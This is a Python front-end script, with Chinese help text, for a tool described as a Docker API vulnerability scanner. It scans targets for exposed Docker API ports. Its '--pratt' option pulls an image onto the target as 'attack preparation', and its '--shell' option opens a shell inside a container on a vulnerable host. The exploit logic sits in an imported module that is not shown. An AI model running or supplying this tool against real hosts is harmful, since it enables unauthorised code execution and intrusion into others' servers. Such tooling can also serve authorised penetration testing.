#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
from docker_api.DockerAPI import DockerAPI


def main():
    import argparse

    parser = argparse.ArgumentParser(description="Docker API 漏洞扫描器 (支持多端口扫描)")
    parser.add_argument("target", help="目标IP地址或域名")
    parser.add_argument("-p", "--ports", default="2375",
                        help="Docker API端口 (默认: 2375)。支持格式: 2375, 2375-2380, 2375,2376,2377")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="请求超时时间 (默认: 10秒)")
    parser.add_argument("--threads", type=int, default=5, help="并发线程数 (默认: 5)")
    parser.add_argument("--tls", action="store_true", help="使用TLS连接 (如果使用TLS，建议配合--ports参数)")
    parser.add_argument("--pratt", nargs="?", const="alpine",
                        help="""攻击准备(测试目标服务器的镜像)，下载指定镜像(默认:alpine,推荐体积小)，会留下镜像痕迹，下载成功不就不要换镜像使用了。格式: --pratt <镜像名> 或 --pratt""")
    parser.add_argument("--shell", action="store_true",
                        help="返回容器里的bash（一些镜像可能没有bash，会采用sh，如果都没有那建议用alpine）")

    args = parser.parse_args()

    try:
        scanner = DockerAPI(
            target=args.target,
            ports=args.ports,
            timeout=args.timeout,
            threads=args.threads
        )
        vulnerabilities, scan_results = scanner.scan_all()

        # 找到可访问的端口
        accessible_ports = []
        for result in scan_results:
            if result["accessible"]:
                accessible_ports.append(result["port"])

        scanner.generate_report(vulnerabilities, scan_results)

        # 处理 pratt 和 shell 参数
        if accessible_ports:
            # 确定要使用的镜像名称
            image_name = "alpine"  # 默认镜像

            # 如果指定了 --pratt，则使用指定的镜像
            if args.pratt:
                image_name = args.pratt
                print(f"\n使用镜像: {image_name}")

                # 对所有可访问端口执行攻击准备
                for port in accessible_ports:
                    print(f"\n对端口 {port} 执行攻击准备:")
                    scanner.run_pratt(port, image_name)

            # 如果指定了 --shell，则尝试获取shell
            if args.shell:
                if not accessible_ports:
                    print("[-] 没有可访问的端口，无法获取shell")
                    return

                # 让用户选择端口（如果有多个可访问端口）
                if len(accessible_ports) > 1:
                    print(f"\n发现多个可访问端口:")
                    for i, port in enumerate(accessible_ports, 1):
                        print(f"  {i}. 端口 {port}")

                    try:
                        choice = int(input("请选择要连接的端口编号: "))
                        if 1 <= choice <= len(accessible_ports):
                            selected_port = accessible_ports[choice-1]
                        else:
                            print("[-] 选择无效，使用第一个端口")
                            selected_port = accessible_ports[0]
                    except (ValueError, KeyboardInterrupt):
                        print("[-] 输入无效，使用第一个端口")
                        selected_port = accessible_ports[0]
                else:
                    selected_port = accessible_ports[0]

                print(f"\n尝试获取shell (端口: {selected_port}, 镜像: {image_name}):")
                scanner.run_shell(selected_port, image_name)

    except KeyboardInterrupt:
        print("\n操作被用户中断")
        sys.exit(1)
    except Exception as e:
        print(f"出错: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()